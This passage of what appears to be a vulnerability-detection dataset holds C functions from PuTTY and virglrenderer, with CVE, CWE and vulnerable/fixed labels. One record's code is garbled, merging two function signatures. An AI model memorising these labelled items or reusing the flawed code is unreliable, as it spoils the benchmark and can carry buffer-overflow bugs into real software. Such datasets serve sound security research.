c->localid,\n\t\t    PKT_END);\n    }\n}\n\nstatic void ssh1_msg_port_open(Ssh ssh, struct Packet *pktin)\n{\n    /* Remote side is trying to open a channel to talk to a\n     * forwarded port. Give them back a local channel number. */\n    struct ssh_rportfwd pf, *pfp;\n    int remoteid;\n    int hostsize, port;\n    char *host;\n    char *err;\n\n    remoteid = ssh_pkt_getuint32(pktin);\n    ssh_pkt_getstring(pktin, &host, &hostsize);\n    port = ssh_pkt_getuint32(pktin);\n\n    pf.dhost = dupprintf(\"%.*s\", hostsize, NULLTOEMPTY(host));\n    pf.dport = port;\n    pfp = find234(ssh->rportfwds, &pf, NULL);\n\n    if (pfp == NULL) {\n\tlogeventf(ssh, \"Rejected remote port open request for %s:%d\",\n\t\t  pf.dhost, port);\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t    PKT_INT, remoteid, PKT_END);\n    } else {\n        struct ssh_channel *c = snew(struct ssh_channel);\n        c->ssh = ssh;\n\n\tlogeventf(ssh, \"Received remote port open request for %s:%d\",\n\t\t  pf.dhost, port);\n\terr = pfd_connect(&c->u.pfd.pf, pf.dhost, port,\n                          c, ssh->conf, pfp->pfrec->addressfamily);\n\tif (err != NULL) {\n\t    logeventf(ssh, \"Port open failed: %s\", err);\n            sfree(err);\n\t    sfree(c);\n\t    send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t\tPKT_INT, remoteid, PKT_END);\n\t} else {\n\t    ssh_channel_init(c);\n\t    c->remoteid = remoteid;\n\t    c->halfopen = FALSE;\n\t    c->type = CHAN_SOCKDATA;\t/* identify channel type */\n\t    send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n\t\t\tPKT_INT, c->remoteid, PKT_INT,\n\t\t\tc->localid, PKT_END);\n\t    logevent(\"Forwarded port opened successfully\");\n\t}\n    }\n\n    sfree(pf.dhost);\n}\n\nstatic void ssh1_msg_channel_open_confirmation(Ssh ssh, struct Packet *pktin)\n{\n    struct ssh_channel *c;\n\n    c = ssh_channel_msg(ssh, pktin);\n    if (c && c->type == CHAN_SOCKDATA) {\n\tc->remoteid = ssh_pkt_getuint32(pktin);\n\tc->halfopen = FALSE;\n\tc->throttling_conn = 0;\n\tpfd_confirm(c->u.pfd.pf);\n    }\n\n    if (c && c->pending_eof) {\n\t/*\n\t * We have a pending close on this channel,\n\t * which we decided on before the server acked\n\t * the channel open. So now we know the\n\t * remoteid, we can close it again.\n\t */\n        ssh_channel_try_eof(c);\n    }\n}\n\n        c->remoteid = remoteid;\n        c->halfopen = FALSE;\n        c->type = CHAN_AGENT;   /* identify channel type */\n        c->u.a.pending = NULL;\n        bufchain_init(&c->u.a.inbuffer);\n        send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n                    PKT_INT, c->remoteid, PKT_INT, c->localid,\n                    PKT_END);\n\tdel234(ssh->channels, c);\n\tsfree(c);\n    }\n}\n", "func_hash": 245301482448712873104203214442039471825, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-6542", "cve_desc": "The ssh_agent_channel_data function in PuTTY before 0.68 allows remote attackers to have unspecified impact via a large length value in an agent protocol message and leveraging the ability to connect to the Unix-domain socket representing the forwarded agent connection, which trigger a buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-6542"}
{"idx": 158101, "project": "virglrenderer", "commit_id": "e534b51ca3c3cd25f3990589932a9ed711c59b27", "project_url": "https://gitlab.freedesktop.org/virgl/virglrenderer", "commit_url": "https://cgit.freedesktop.org/virglrenderer/commit/?id=e534b51ca3c3cd25f3990589932a9ed711c59b27", "commit_message": "gallium/tgsi: fix overflow in parse property\n\nIn parse_identifier, it doesn't stop copying '*pcur'\nuntill encounter the NULL. As the 'ret' has a\nfixed-size buffer, if the '*pcur' has a long string,\nthere will be a buffer overflow. This patch avoid this.\n\nSigned-off-by: Li Qiang <liq3ea@gmail.com>\nReviewed-by: Marc-Andr\u00e9 Lureau <marcandre.lureau@redhat.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 0, "func": "static boolean parse_identifier( const char **pcur, char *ret )\nstatic boolean parse_identifier( const char **pcur, char *ret, size_t len )\n {\n    const char *cur = *pcur;\n    int i = 0;\n    if (is_alpha_underscore( cur )) {\n       ret[i++] = *cur++;\n      while (is_alpha_underscore( cur ) || is_digit( cur )) {\n         if (i == len - 1)\n            return FALSE;\n          ret[i++] = *cur++;\n      }\n       ret[i++] = '\\0';\n       *pcur = cur;\n       return TRUE;\n\n/* Parse floating point.\n */\nstatic boolean parse_float( const char **pcur, float *val )\n{\n   const char *cur = *pcur;\n   boolean integral_part = FALSE;\n   boolean fractional_part = FALSE;\n\n   if (*cur == '0' && *(cur + 1) == 'x') {\n      union fi fi;\n      fi.ui = strtoul(cur, NULL, 16);\n      *val = fi.f;\n      cur += 10;\n      goto out;\n   }\n\n   *val = (float) atof( cur );\n   if (*cur == '-' || *cur == '+')\n      cur++;\n   if (is_digit( cur )) {\n      cur++;\n      integral_part = TRUE;\n      while (is_digit( cur ))\n         cur++;\n   }\n   if (*cur == '.') {\n      cur++;\n      if (is_digit( cur )) {\n         cur++;\n         fractional_part = TRUE;\n         while (is_digit( cur ))\n            cur++;\n      }\n   }\n   if (!integral_part && !fractional_part)\n      return FALSE;\n   if (uprcase( *cur ) == 'E') {\n      cur++;\n      if (*cur == '-' || *cur == '+')\n         cur++;\n      if (is_digit( cur )) {\n         cur++;\n         while (is_digit( cur ))\n            cur++;\n      }\n      else\n         return FALSE;\n   }\n\nout:\n   *pcur = cur;\n   return TRUE;\n}\n\nstatic boolean parse_double( const char **pcur, uint32_t *val0, uint32_t *val1)\n{\n   const char *cur = *pcur;\n   union {\n      double dval;\n      uint32_t uval[2];\n   } v;\n\n   v.dval = strtod(cur, (char**)pcur);\n   if (*pcur == cur)\n      return FALSE;\n\n   *val0 = v.uval[0];\n   *val1 = v.uval[1];\n\n   return TRUE;\n}\n\nstruct translate_ctx\n{\n   const char *text;\n   const char *cur;\n   struct tgsi_token *tokens;\n   struct tgsi_token *tokens_cur;\n   struct tgsi_token *tokens_end;\n   struct tgsi_header *header;\n   unsigned processor : 4;\n   unsigned implied_array_size : 6;\n   unsigned num_immediates;\n};\n\nstatic void report_error(struct translate_ctx *ctx, const char *format, ...)\n{\n   va_list args;\n   int line = 1;\n   int column = 1;\n   const char *itr = ctx->text;\n\n   debug_printf(\"\\nTGSI asm error: \");\n\n   va_start(args, format);\n   _debug_vprintf(format, args);\n   va_end(args);\n\n   while (itr != ctx->cur) {\n      if (*itr == '\\n') {\n         column = 1;\n         ++line;\n      }\n      ++column;\n      ++itr;\n   }\n\n   debug_printf(\" [%d : %d] \\n\", line, column);\n}\n\n/* Parse shader header.\n * Return TRUE for one of the following headers.\n *    FRAG\n *    GEOM\n *    VERT\n */\nstatic boolean parse_header( struct translate_ctx *ctx )\n{\n   uint processor;\n\n   if (str_match_nocase_whole( &ctx->cur, \"FRAG\" ))\n      processor = TGSI_PROCESSOR_FRAGMENT;\n   else if (str_match_nocase_whole( &ctx->cur, \"VERT\" ))\n      processor = TGSI_PROCESSOR_VERTEX;\n   else if (str_match_nocase_whole( &ctx->cur, \"GEOM\" ))\n      processor = TGSI_PROCESSOR_GEOMETRY;\n   else if (str_match_nocase_whole( &ctx->cur, \"TESS_CTRL\" ))\n      processor = TGSI_PROCESSOR_TESS_CTRL;\n   else if (str_match_nocase_whole( &ctx->cur, \"TESS_EVAL\" ))\n      processor = TGSI_PROCESSOR_TESS_EVAL;\n   else if (str_match_nocase_whole( &ctx->cur, \"COMP\" ))\n      processor = TGSI_PROCESSOR_COMPUTE;\n   else {\n      report_error( ctx, \"Unknown header\" );\n      return FALSE;\n   }\n\n   if (ctx->tokens_cur >= ctx->tokens_end)\n      return FALSE;\n   ctx->header = (struct tgsi_header *) ctx->tokens_cur++;\n   *ctx->header = tgsi_build_header();\n\n   if (ctx->tokens_cur >= ctx->tokens_end)\n      return FALSE;\n   *(struct tgsi_processor *) ctx->tokens_cur++ = tgsi_build_processor( processor, ctx->header );\n   ctx->processor = processor;\n\n   return TRUE;\n}\n\nstatic boolean parse_label( struct translate_ctx *ctx, uint *val )\n{\n   const char *cur = ctx->cur;\n\n   if (parse_uint( &cur, val )) {\n      eat_opt_white( &cur );\n      if (*cur == ':') {\n         cur++;\n         ctx->cur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_file( const char **pcur, uint *file )\n{\n   uint i;\n\n   for (i = 0; i < TGSI_FILE_COUNT; i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_file_name(i) )) {\n         *pcur = cur;\n         *file = i;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_opt_writemask(\n   struct translate_ctx *ctx,\n   uint *writemask )\n{\n   const char *cur;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == '.') {\n      cur++;\n      *writemask = TGSI_WRITEMASK_NONE;\n      eat_opt_white( &cur );\n      if (uprcase( *cur ) == 'X') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_X;\n      }\n      if (uprcase( *cur ) == 'Y') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_Y;\n      }\n      if (uprcase( *cur ) == 'Z') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_Z;\n      }\n      if (uprcase( *cur ) == 'W') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_W;\n      }\n\n      if (*writemask == TGSI_WRITEMASK_NONE) {\n         report_error( ctx, \"Writemask expected\" );\n         return FALSE;\n      }\n\n      ctx->cur = cur;\n   }\n   else {\n      *writemask = TGSI_WRITEMASK_XYZW;\n   }\n   return TRUE;\n}\n\n\n/* <register_file_bracket> ::= <file> `['\n */\nstatic boolean\nparse_register_file_bracket(\n   struct translate_ctx *ctx,\n   uint *file )\n{\n   if (!parse_file( &ctx->cur, file )) {\n      report_error( ctx, \"Unknown register file\" );\n      return FALSE;\n   }\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != '[') {\n      report_error( ctx, \"Expected `['\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   return TRUE;\n}\n\n/* <register_file_bracket_index> ::= <register_file_bracket> <uint>\n */\nstatic boolean\nparse_register_file_bracket_index(\n   struct translate_ctx *ctx,\n   uint *file,\n   int *index )\n{\n   uint uindex;\n\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   eat_opt_white( &ctx->cur );\n   if (!parse_uint( &ctx->cur, &uindex )) {\n      report_error( ctx, \"Expected literal unsigned integer\" );\n      return FALSE;\n   }\n   *index = (int) uindex;\n   return TRUE;\n}\n\n/* Parse simple 1d register operand.\n *    <register_dst> ::= <register_file_bracket_index> `]'\n */\nstatic boolean\nparse_register_1d(struct translate_ctx *ctx,\n                  uint *file,\n                  int *index )\n{\n   if (!parse_register_file_bracket_index( ctx, file, index ))\n      return FALSE;\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != ']') {\n      report_error( ctx, \"Expected `]'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   return TRUE;\n}\n\nstruct parsed_bracket {\n   int index;\n\n   uint ind_file;\n   int ind_index;\n   uint ind_comp;\n   uint ind_array;\n};\n\n\nstatic boolean\nparse_register_bracket(\n   struct translate_ctx *ctx,\n   struct parsed_bracket *brackets)\n{\n   const char *cur;\n   uint uindex;\n\n   memset(brackets, 0, sizeof(struct parsed_bracket));\n\n   eat_opt_white( &ctx->cur );\n\n   cur = ctx->cur;\n   if (parse_file( &cur, &brackets->ind_file )) {\n      if (!parse_register_1d( ctx, &brackets->ind_file,\n                              &brackets->ind_index ))\n         return FALSE;\n      eat_opt_white( &ctx->cur );\n\n      if (*ctx->cur == '.') {\n         ctx->cur++;\n         eat_opt_white(&ctx->cur);\n\n         switch (uprcase(*ctx->cur)) {\n         case 'X':\n            brackets->ind_comp = TGSI_SWIZZLE_X;\n            break;\n         case 'Y':\n            brackets->ind_comp = TGSI_SWIZZLE_Y;\n            break;\n         case 'Z':\n            brackets->ind_comp = TGSI_SWIZZLE_Z;\n            break;\n         case 'W':\n            brackets->ind_comp = TGSI_SWIZZLE_W;\n            break;\n         default:\n            report_error(ctx, \"Expected indirect register swizzle component `x', `y', `z' or `w'\");\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white(&ctx->cur);\n      }\n\n      if (*ctx->cur == '+' || *ctx->cur == '-')\n         parse_int( &ctx->cur, &brackets->index );\n      else\n         brackets->index = 0;\n   }\n   else {\n      if (!parse_uint( &ctx->cur, &uindex )) {\n         report_error( ctx, \"Expected literal unsigned integer\" );\n         return FALSE;\n      }\n      brackets->index = (int) uindex;\n      brackets->ind_file = TGSI_FILE_NULL;\n      brackets->ind_index = 0;\n   }\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != ']') {\n      report_error( ctx, \"Expected `]'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   if (*ctx->cur == '(') {\n      ctx->cur++;\n      eat_opt_white( &ctx->cur );\n      if (!parse_uint( &ctx->cur, &brackets->ind_array )) {\n         report_error( ctx, \"Expected literal unsigned integer\" );\n         return FALSE;\n      }\n      eat_opt_white( &ctx->cur );\n      if (*ctx->cur != ')') {\n         report_error( ctx, \"Expected `)'\" );\n         return FALSE;\n      }\n      ctx->cur++;\n   }\n   return TRUE;\n}\n\nstatic boolean\nparse_opt_register_src_bracket(\n   struct translate_ctx *ctx,\n   struct parsed_bracket *brackets,\n   int *parsed_brackets)\n{\n   const char *cur = ctx->cur;\n\n   *parsed_brackets = 0;\n\n   eat_opt_white( &cur );\n   if (cur[0] == '[') {\n      ++cur;\n      ctx->cur = cur;\n\n      if (!parse_register_bracket(ctx, brackets))\n         return FALSE;\n\n      *parsed_brackets = 1;\n   }\n\n   return TRUE;\n}\n\n\n/* Parse source register operand.\n *    <register_src> ::= <register_file_bracket_index> `]' |\n *                       <register_file_bracket> <register_dst> [`.' (`x' | `y' | `z' | `w')] `]' |\n *                       <register_file_bracket> <register_dst> [`.' (`x' | `y' | `z' | `w')] `+' <uint> `]' |\n *                       <register_file_bracket> <register_dst> [`.' (`x' | `y' | `z' | `w')] `-' <uint> `]'\n */\nstatic boolean\nparse_register_src(\n   struct translate_ctx *ctx,\n   uint *file,\n   struct parsed_bracket *brackets)\n{\n   brackets->ind_comp = TGSI_SWIZZLE_X;\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   if (!parse_register_bracket( ctx, brackets ))\n       return FALSE;\n\n   return TRUE;\n}\n\nstruct parsed_dcl_bracket {\n   uint first;\n   uint last;\n};\n\nstatic boolean\nparse_register_dcl_bracket(\n   struct translate_ctx *ctx,\n   struct parsed_dcl_bracket *bracket)\n{\n   uint uindex;\n   memset(bracket, 0, sizeof(struct parsed_dcl_bracket));\n\n   eat_opt_white( &ctx->cur );\n\n   if (!parse_uint( &ctx->cur, &uindex )) {\n      /* it can be an empty bracket [] which means its range\n       * is from 0 to some implied size */\n      if (ctx->cur[0] == ']' && ctx->implied_array_size != 0) {\n         bracket->first = 0;\n         bracket->last = ctx->implied_array_size - 1;\n         goto cleanup;\n      }\n      report_error( ctx, \"Expected literal unsigned integer\" );\n      return FALSE;\n   }\n   bracket->first = uindex;\n\n   eat_opt_white( &ctx->cur );\n\n   if (ctx->cur[0] == '.' && ctx->cur[1] == '.') {\n      uint uindex;\n\n      ctx->cur += 2;\n      eat_opt_white( &ctx->cur );\n      if (!parse_uint( &ctx->cur, &uindex )) {\n         report_error( ctx, \"Expected literal integer\" );\n         return FALSE;\n      }\n      bracket->last = (int) uindex;\n      eat_opt_white( &ctx->cur );\n   }\n   else {\n      bracket->last = bracket->first;\n   }\n\ncleanup:\n   if (*ctx->cur != ']') {\n      report_error( ctx, \"Expected `]' or `..'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   return TRUE;\n}\n\n/* Parse register declaration.\n *    <register_dcl> ::= <register_file_bracket_index> `]' |\n *                       <register_file_bracket_index> `..' <index> `]'\n */\nstatic boolean\nparse_register_dcl(\n   struct translate_ctx *ctx,\n   uint *file,\n   struct parsed_dcl_bracket *brackets,\n   int *num_brackets)\n{\n   const char *cur;\n\n   *num_brackets = 0;\n\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   if (!parse_register_dcl_bracket( ctx, &brackets[0] ))\n      return FALSE;\n\n   *num_brackets = 1;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n\n   if (cur[0] == '[') {\n      bool is_in = *file == TGSI_FILE_INPUT;\n      bool is_out = *file == TGSI_FILE_OUTPUT;\n\n      ++cur;\n      ctx->cur = cur;\n      if (!parse_register_dcl_bracket( ctx, &brackets[1] ))\n         return FALSE;\n      /* for geometry shader we don't really care about\n       * the first brackets it's always the size of the\n       * input primitive. so we want to declare just\n       * the index relevant to the semantics which is in\n       * the second bracket */\n\n      /* tessellation has similar constraints to geometry shader */\n      if ((ctx->processor == TGSI_PROCESSOR_GEOMETRY && is_in) ||\n          (ctx->processor == TGSI_PROCESSOR_TESS_EVAL && is_in) ||\n          (ctx->processor == TGSI_PROCESSOR_TESS_CTRL && (is_in || is_out))) {\n         brackets[0] = brackets[1];\n         *num_brackets = 1;\n      } else {\n         *num_brackets = 2;\n      }\n   }\n\n   return TRUE;\n}\n\n\n/* Parse destination register operand.*/\nstatic boolean\nparse_register_dst(\n   struct translate_ctx *ctx,\n   uint *file,\n   struct parsed_bracket *brackets)\n{\n   brackets->ind_comp = TGSI_SWIZZLE_X;\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   if (!parse_register_bracket( ctx, brackets ))\n       return FALSE;\n\n   return TRUE;\n}\n\nstatic boolean\nparse_dst_operand(\n   struct translate_ctx *ctx,\n   struct tgsi_full_dst_register *dst )\n{\n   uint file;\n   uint writemask;\n   const char *cur;\n   struct parsed_bracket bracket[2];\n   int parsed_opt_brackets;\n\n   if (!parse_register_dst( ctx, &file, &bracket[0] ))\n      return FALSE;\n   if (!parse_opt_register_src_bracket(ctx, &bracket[1], &parsed_opt_brackets))\n      return FALSE;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n\n   if (!parse_opt_writemask( ctx, &writemask ))\n      return FALSE;\n\n   dst->Register.File = file;\n   if (parsed_opt_brackets) {\n      dst->Register.Dimension = 1;\n      dst->Dimension.Indirect = 0;\n      dst->Dimension.Dimension = 0;\n      dst->Dimension.Index = bracket[0].index;\n\n      if (bracket[0].ind_file != TGSI_FILE_NULL) {\n         dst->Dimension.Indirect = 1;\n         dst->DimIndirect.File = bracket[0].ind_file;\n         dst->DimIndirect.Index = bracket[0].ind_index;\n         dst->DimIndirect.Swizzle = bracket[0].ind_comp;\n         dst->DimIndirect.ArrayID = bracket[0].ind_array;\n      }\n      bracket[0] = bracket[1];\n   }\n   dst->Register.Index = bracket[0].index;\n   dst->Register.WriteMask = writemask;\n   if (bracket[0].ind_file != TGSI_FILE_NULL) {\n      dst->Register.Indirect = 1;\n      dst->Indirect.File = bracket[0].ind_file;\n      dst->Indirect.Index = bracket[0].ind_index;\n      dst->Indirect.Swizzle = bracket[0].ind_comp;\n      dst->Indirect.ArrayID = bracket[0].ind_array;\n   }\n   return TRUE;\n}\n\nstatic boolean\nparse_optional_swizzle(\n   struct translate_ctx *ctx,\n   uint *swizzle,\n   boolean *parsed_swizzle,\n   int components)\n{\n   const char *cur = ctx->cur;\n\n   *parsed_swizzle = FALSE;\n\n   eat_opt_white( &cur );\n   if (*cur == '.') {\n      uint i;\n\n      cur++;\n      eat_opt_white( &cur );\n      for (i = 0; i < components; i++) {\n         if (uprcase( *cur ) == 'X')\n            swizzle[i] = TGSI_SWIZZLE_X;\n         else if (uprcase( *cur ) == 'Y')\n            swizzle[i] = TGSI_SWIZZLE_Y;\n         else if (uprcase( *cur ) == 'Z')\n            swizzle[i] = TGSI_SWIZZLE_Z;\n         else if (uprcase( *cur ) == 'W')\n            swizzle[i] = TGSI_SWIZZLE_W;\n         else {\n\t    report_error( ctx, \"Expected register swizzle component `x', `y', `z' or `w'\" );\n\t    return FALSE;\n         }\n         cur++;\n      }\n      *parsed_swizzle = TRUE;\n      ctx->cur = cur;\n   }\n   return TRUE;\n}\n\nstatic boolean\nparse_src_operand(\n   struct translate_ctx *ctx,\n   struct tgsi_full_src_register *src )\n{\n   uint file;\n   uint swizzle[4];\n   boolean parsed_swizzle;\n   struct parsed_bracket bracket[2];\n   int parsed_opt_brackets;\n\n   if (*ctx->cur == '-') {\n      ctx->cur++;\n      eat_opt_white( &ctx->cur );\n      src->Register.Negate = 1;\n   }\n\n   if (*ctx->cur == '|') {\n      ctx->cur++;\n      eat_opt_white( &ctx->cur );\n      src->Register.Absolute = 1;\n   }\n\n   if (!parse_register_src(ctx, &file, &bracket[0]))\n      return FALSE;\n   if (!parse_opt_register_src_bracket(ctx, &bracket[1], &parsed_opt_brackets))\n      return FALSE;\n\n   src->Register.File = file;\n   if (parsed_opt_brackets) {\n      src->Register.Dimension = 1;\n      src->Dimension.Indirect = 0;\n      src->Dimension.Dimension = 0;\n      src->Dimension.Index = bracket[0].index;\n      if (bracket[0].ind_file != TGSI_FILE_NULL) {\n         src->Dimension.Indirect = 1;\n         src->DimIndirect.File = bracket[0].ind_file;\n         src->DimIndirect.Index = bracket[0].ind_index;\n         src->DimIndirect.Swizzle = bracket[0].ind_comp;\n         src->DimIndirect.ArrayID = bracket[0].ind_array;\n      }\n      bracket[0] = bracket[1];\n   }\n   src->Register.Index = bracket[0].index;\n   if (bracket[0].ind_file != TGSI_FILE_NULL) {\n      src->Register.Indirect = 1;\n      src->Indirect.File = bracket[0].ind_file;\n      src->Indirect.Index = bracket[0].ind_index;\n      src->Indirect.Swizzle = bracket[0].ind_comp;\n      src->Indirect.ArrayID = bracket[0].ind_array;\n   }\n\n   /* Parse optional swizzle.\n    */\n   if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 4 )) {\n      if (parsed_swizzle) {\n         src->Register.SwizzleX = swizzle[0];\n         src->Register.SwizzleY = swizzle[1];\n         src->Register.SwizzleZ = swizzle[2];\n         src->Register.SwizzleW = swizzle[3];\n      }\n   }\n\n   if (src->Register.Absolute) {\n      eat_opt_white( &ctx->cur );\n      if (*ctx->cur != '|') {\n         report_error( ctx, \"Expected `|'\" );\n         return FALSE;\n      }\n      ctx->cur++;\n   }\n\n\n   return TRUE;\n}\n\nstatic boolean\nparse_texoffset_operand(\n   struct translate_ctx *ctx,\n   struct tgsi_texture_offset *src )\n{\n   uint file;\n   uint swizzle[3];\n   boolean parsed_swizzle;\n   struct parsed_bracket bracket;\n\n   if (!parse_register_src(ctx, &file, &bracket))\n      return FALSE;\n\n   src->File = file;\n   src->Index = bracket.index;\n\n   /* Parse optional swizzle.\n    */\n   if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 3 )) {\n      if (parsed_swizzle) {\n         src->SwizzleX = swizzle[0];\n         src->SwizzleY = swizzle[1];\n         src->SwizzleZ = swizzle[2];\n      }\n   }\n\n   return TRUE;\n}\n\nstatic boolean\nmatch_inst(const char **pcur,\n           unsigned *saturate,\n           const struct tgsi_opcode_info *info)\n{\n   const char *cur = *pcur;\n\n   /* simple case: the whole string matches the instruction name */\n   if (str_match_nocase_whole(&cur, info->mnemonic)) {\n      *pcur = cur;\n      *saturate = 0;\n      return TRUE;\n   }\n\n   if (str_match_no_case(&cur, info->mnemonic)) {\n      /* the instruction has a suffix, figure it out */\n      if (str_match_nocase_whole(&cur, \"_SAT\")) {\n         *pcur = cur;\n         *saturate = 1;\n         return TRUE;\n      }\n   }\n\n   return FALSE;\n}\n\nstatic boolean\nparse_instruction(\n   struct translate_ctx *ctx,\n   boolean has_label )\n{\n   uint i;\n   uint saturate = 0;\n   const struct tgsi_opcode_info *info;\n   struct tgsi_full_instruction inst;\n   const char *cur;\n   uint advance;\n\n   inst = tgsi_default_full_instruction();\n\n   /* Parse predicate.\n    */\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur == '(') {\n      uint file;\n      int index;\n      uint swizzle[4];\n      boolean parsed_swizzle;\n\n      inst.Instruction.Predicate = 1;\n\n      ctx->cur++;\n      if (*ctx->cur == '!') {\n         ctx->cur++;\n         inst.Predicate.Negate = 1;\n      }\n\n      if (!parse_register_1d( ctx, &file, &index ))\n         return FALSE;\n\n      if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 4 )) {\n         if (parsed_swizzle) {\n            inst.Predicate.SwizzleX = swizzle[0];\n            inst.Predicate.SwizzleY = swizzle[1];\n            inst.Predicate.SwizzleZ = swizzle[2];\n            inst.Predicate.SwizzleW = swizzle[3];\n         }\n      }\n\n      if (*ctx->cur != ')') {\n         report_error( ctx, \"Expected `)'\" );\n         return FALSE;\n      }\n\n      ctx->cur++;\n   }\n\n   /* Parse instruction name.\n    */\n   eat_opt_white( &ctx->cur );\n   for (i = 0; i < TGSI_OPCODE_LAST; i++) {\n      cur = ctx->cur;\n\n      info = tgsi_get_opcode_info( i );\n      if (match_inst(&cur, &saturate, info)) {\n         if (info->num_dst + info->num_src + info->is_tex == 0) {\n            ctx->cur = cur;\n            break;\n         }\n         else if (*cur == '\\0' || eat_white( &cur )) {\n            ctx->cur = cur;\n            break;\n         }\n      }\n   }\n   if (i == TGSI_OPCODE_LAST) {\n      if (has_label)\n         report_error( ctx, \"Unknown opcode\" );\n      else\n         report_error( ctx, \"Expected `DCL', `IMM' or a label\" );\n      return FALSE;\n   }\n\n   inst.Instruction.Opcode = i;\n   inst.Instruction.Saturate = saturate;\n   inst.Instruction.NumDstRegs = info->num_dst;\n   inst.Instruction.NumSrcRegs = info->num_src;\n\n   if (i >= TGSI_OPCODE_SAMPLE && i <= TGSI_OPCODE_GATHER4) {\n      /*\n       * These are not considered tex opcodes here (no additional\n       * target argument) however we're required to set the Texture\n       * bit so we can set the number of tex offsets.\n       */\n      inst.Instruction.Texture = 1;\n      inst.Texture.Texture = TGSI_TEXTURE_UNKNOWN;\n   }\n\n   /* Parse instruction operands.\n    */\n   for (i = 0; i < info->num_dst + info->num_src + info->is_tex; i++) {\n      if (i > 0) {\n         eat_opt_white( &ctx->cur );\n         if (*ctx->cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white( &ctx->cur );\n      }\n\n      if (i < info->num_dst) {\n         if (!parse_dst_operand( ctx, &inst.Dst[i] ))\n            return FALSE;\n      }\n      else if (i < info->num_dst + info->num_src) {\n         if (!parse_src_operand( ctx, &inst.Src[i - info->num_dst] ))\n            return FALSE;\n      }\n      else {\n         uint j;\n\n         for (j = 0; j < TGSI_TEXTURE_COUNT; j++) {\n            if (str_match_nocase_whole( &ctx->cur, tgsi_texture_names[j] )) {\n               inst.Instruction.Texture = 1;\n               inst.Texture.Texture = j;\n               break;\n            }\n         }\n         if (j == TGSI_TEXTURE_COUNT) {\n            report_error( ctx, \"Expected texture target\" );\n            return FALSE;\n         }\n      }\n   }\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   for (i = 0; inst.Instruction.Texture && *cur == ','; i++) {\n         cur++;\n         eat_opt_white( &cur );\n         ctx->cur = cur;\n         if (!parse_texoffset_operand( ctx, &inst.TexOffsets[i] ))\n            return FALSE;\n         cur = ctx->cur;\n         eat_opt_white( &cur );\n   }\n   inst.Texture.NumOffsets = i;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (info->is_branch && *cur == ':') {\n      uint target;\n\n      cur++;\n      eat_opt_white( &cur );\n      if (!parse_uint( &cur, &target )) {\n         report_error( ctx, \"Expected a label\" );\n         return FALSE;\n      }\n      inst.Instruction.Label = 1;\n      inst.Label.Label = target;\n      ctx->cur = cur;\n   }\n\n   advance = tgsi_build_full_instruction(\n      &inst,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   return TRUE;\n}\n\n/* parses a 4-touple of the form {x, y, z, w}\n * where x, y, z, w are numbers */\nstatic boolean parse_immediate_data(struct translate_ctx *ctx, unsigned type,\n                                    union tgsi_immediate_data *values)\n{\n   unsigned i;\n   int ret;\n\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != '{') {\n      report_error( ctx, \"Expected `{'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   for (i = 0; i < 4; i++) {\n      eat_opt_white( &ctx->cur );\n      if (i > 0) {\n         if (*ctx->cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white( &ctx->cur );\n      }\n\n      switch (type) {\n      case TGSI_IMM_FLOAT64:\n         ret = parse_double(&ctx->cur, &values[i].Uint, &values[i+1].Uint);\n         i++;\n         break;\n      case TGSI_IMM_FLOAT32:\n         ret = parse_float(&ctx->cur, &values[i].Float);\n         break;\n      case TGSI_IMM_UINT32:\n         ret = parse_uint(&ctx->cur, &values[i].Uint);\n         break;\n      case TGSI_IMM_INT32:\n         ret = parse_int(&ctx->cur, &values[i].Int);\n         break;\n      default:\n         assert(0);\n         ret = FALSE;\n         break;\n      }\n\n      if (!ret) {\n         report_error( ctx, \"Expected immediate constant\" );\n         return FALSE;\n      }\n   }\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != '}') {\n      report_error( ctx, \"Expected `}'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n\n   return TRUE;\n}\n\nstatic boolean parse_declaration( struct translate_ctx *ctx 